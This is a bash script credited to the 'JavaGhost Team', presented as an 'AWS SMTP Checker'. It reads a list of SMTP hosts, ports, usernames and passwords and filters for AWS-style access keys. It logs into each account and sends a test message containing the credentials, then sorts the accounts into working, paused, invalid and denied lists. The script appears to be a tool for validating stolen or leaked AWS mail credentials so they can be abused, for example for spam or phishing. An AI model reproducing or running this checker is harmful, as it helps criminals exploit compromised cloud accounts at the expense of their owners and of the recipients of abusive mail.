# !/bin/bash
# Created by 	: ./LazyBoy - JavaGhost Team
# Follow me 	: https://github.com/noolep

# color(bold)
red='\e[1;31m'
green='\e[1;32m'
yellow='\e[1;33m'
blue='\e[1;34m'
magenta='\e[1;35m'
cyan='\e[1;36m'
white='\e[1;37m'

# create file
array_file=("valid_list.tmp"
	"valid_aws.tmp"
	"not_aws.tmp"
	"not_have_fm.tmp"
	"email_list.tmp"
	"mail.tmp"
	"response_out.tmp"
	"rejected_smtp.txt"
	"paused_smtp.txt"
	"invalid_smtp.txt"
	"denied_smtp.txt"
	"starttls_error"
	"good_smtp.txt")
for create_file in ${array_file[@]}; do
	touch $create_file
done

# check depen
depen=("curl" "openssl")
for pckg in "${depen[@]}"; do
    command -v $pckg >/dev/null 2>&1 || {
        echo -e >&2 "${white}[ ${red}- ${white}] ${green}$pckg ${blue}: ${red}Not installed${white}"
        exit
    }
done

# banner
echo -e "\t\t${white}AWS SMTP Checker ${blue}- ${white}JavaGhost Team\n\t     [ ${red}NOTE ${blue}: ${yellow}ONLY FOR CHECK SEND AWS SMTP ${white}]${white}\n"

# ask list + info
echo -e "${white}[ ${red}INFO ${white}] ${blue}- ${white}Just put list with delimiter like this ${blue}: ${green}HOST|PORT|USER|PASS|FM${white}"
read -p $'\e[1;37m[ \e[1;32m? \e[1;37m] Input your list \e[1;34m     : \e[1;32m' ask_list
if [[ ! -e $ask_list ]]; then
	echo -e "${white}[ ${red}ERROR ${white}] ${blue}- ${red}File not found in your directory${white}"
	exit
else
	# get valid aws + only get AWS have FM
	cat $ask_list | grep -aP '(?<![A-Z0-9])[A-Z0-9]{20}(?![A-Z0-9])' > valid_list.tmp
	cat $ask_list | grep -avP '(?<![A-Z0-9])[A-Z0-9]{20}(?![A-Z0-9])' > not_aws.tmp
	cat valid_list.tmp | grep "@" > valid_aws.tmp
	cat valid_list.tmp | grep -v "@" > not_have_fm.tmp

	# info
	echo -e "${white}[ ${red}! ${white}] Use space for input multiple receiver ${blue}- ${white}[ ${green}Ex ${blue}: ${yellow}email_1@domain.tld email_2@domain.tld ${white}]"
	read -p $'\e[1;37m[ \e[1;32m? \e[1;37m] Input receiver email \e[1;34m: \e[1;32m' ask_email
	if [[ -z $ask_email ]]; then
		echo -e "${white}[ ${red}ERROR ${white}] ${blue}- ${red}Input email for receiv!${white}"
		exit
	else
		echo $ask_email | tr " " "\n" > email_list.tmp
		echo -e "${white}[ ${green}+ ${white}] Start checking with  ${blue}: ${green}$(< valid_aws.tmp wc -l) ${white}VALID AWS SMTP ${blue}- ${red}$(< not_have_fm.tmp wc -l) ${white}WITHOUT FM ${blue}- ${red}$(< not_aws.tmp wc -l) ${white}INVALID AWS SMTP\n"
	fi
fi

# run
for data in $(cat valid_aws.tmp); do
	for to_email in $(cat email_list.tmp); do
		cat > mail.tmp <<-EOF
		AUTH LOGIN
		$(echo -n "$(echo $data | cut -d "|" -f3)" | openssl enc -base64)
		$(echo -n "$(echo $data | cut -d "|" -f4)" | openssl enc -base64)
		MAIL FROM: $(echo $data | cut -d "|" -f5)
		RCPT TO: $to_email
		DATA
		From: $(echo $data | cut -d "|" -f5)
		To: $to_email
		Subject: JavaGhost - Mass Tester AWS SMTP

		$(echo "MAIL_HOST 	: $(echo $data | cut -d "|" -f1)")
		$(echo "MAIL_PORT 	: $(echo $data | cut -d "|" -f2)")
		$(echo "MAIL_USER 	: $(echo $data | cut -d "|" -f3)")
		$(echo "MAIL_PASS 	: $(echo $data | cut -d "|" -f4)")
		$(echo "MAIL_FROM 	: $(echo $data | cut -d "|" -f5)")
		.
		QUIT
		EOF

		openssl s_client -crlf -quiet -starttls smtp -connect "$(echo $data | cut -d "|" -f1):$(echo $data | cut -d "|" -f2)" < mail.tmp &> response_out.tmp
		check_send=$(cat response_out.tmp | grep -o "Sending paused for this account.\|Email address is not verified\|Authentication Credentials Invalid\|is not authorized to perform\|Didn't find STARTTLS in server response")
		if [[ $check_send == "Email address is not verified" ]]; then
			echo -e " ${white}[ ${red}CANT SEND ${white}] ${red}$(echo $data | cut -d "|" -f3,4,5) ${blue}: ${red}REJECTED${white}"
			echo $data >> rejected_smtp.txt
			break
		elif [[ $check_send == "Sending paused for this account." ]]; then
			echo -e " ${white}[ ${red}CANT SEND ${white}] ${red}$(echo $data | cut -d "|" -f3,4,5) ${blue}: ${red}SENDING PAUSED${white}"
			echo $data >> paused_smtp.txt
			break
		elif [[ $check_send == "Authentication Credentials Invalid" ]]; then
			echo -e " ${white}[ ${red}CANT SEND ${white}] ${red}$(echo $data | cut -d "|" -f3,4,5) ${blue}: ${red}CREDENTIALS INVALID${white}"
			echo $data >> invalid_smtp.txt
			break
		elif [[ $check_send == "is not authorized to perform" ]]; then
			echo -e " ${white}[ ${red}CANT SEND ${white}] ${red}$(echo $data | cut -d "|" -f3,4,5) ${blue}: ${red}ACCESS DENIED${white}"
			echo $data >> denied_smtp.txt
			break
		elif [[ $check_send == "Didn't find STARTTLS in server response" ]]; then
			echo -e " ${white}[ ${red}CANT SEND ${white}] ${red}$(echo $data | cut -d "|" -f3,4,5) ${blue}: ${red}STARTTLS ERROR${white}"
			echo $data >> starttls_error.txt
			break
		else
			echo -e " ${white}[ ${green}WORK ${white}] ${green}$(echo $data | cut -d "|" -f3,4,5) ${blue}: ${yellow}CHECK YOUR EMAIL${white}"
			echo $data >> good_smtp.txt
			break
		fi
	done
done

echo -e "\n${white}[ ${green}+ ${white}] GOOD AWS SMTP 	${blue}: ${green}$(< good_smtp.txt wc -l)${white}"
echo -e "${white}[ ${red}- ${white}] REJECTED AWS SMTP ${blue}: ${red}$(< rejected_smtp.txt wc -l)${white}"
echo -e "${white}[ ${red}- ${white}] PAUSED AWS SMTP 	${blue}: ${red}$(< paused_smtp.txt wc -l)${white}"
echo -e "${white}[ ${red}- ${white}] INVALID AWS SMTP 	${blue}: ${red}$(< invalid_smtp.txt wc -l)${white}"
echo -e "${white}[ ${red}- ${white}] DENIED AWS SMTP 	${blue}: ${red}$(< denied_smtp.txt wc -l)${white}"
echo -e "${white}[ ${red}- ${white}] NOT AWS SMTP 	${blue}: ${red}$(< not_aws.tmp wc -l)${white}"
echo -e "${white}[ ${red}- ${white}] SMTP WITHOUT FM 	${blue}: ${red}$(< not_have_fm.tmp wc -l)${white}"
echo -e "${white}[ ${red}- ${white}] STARTTLS ERROR 	${blue}: ${red}$(< starttls_error.txt wc -l)${white}"
rm *.tmp*
# done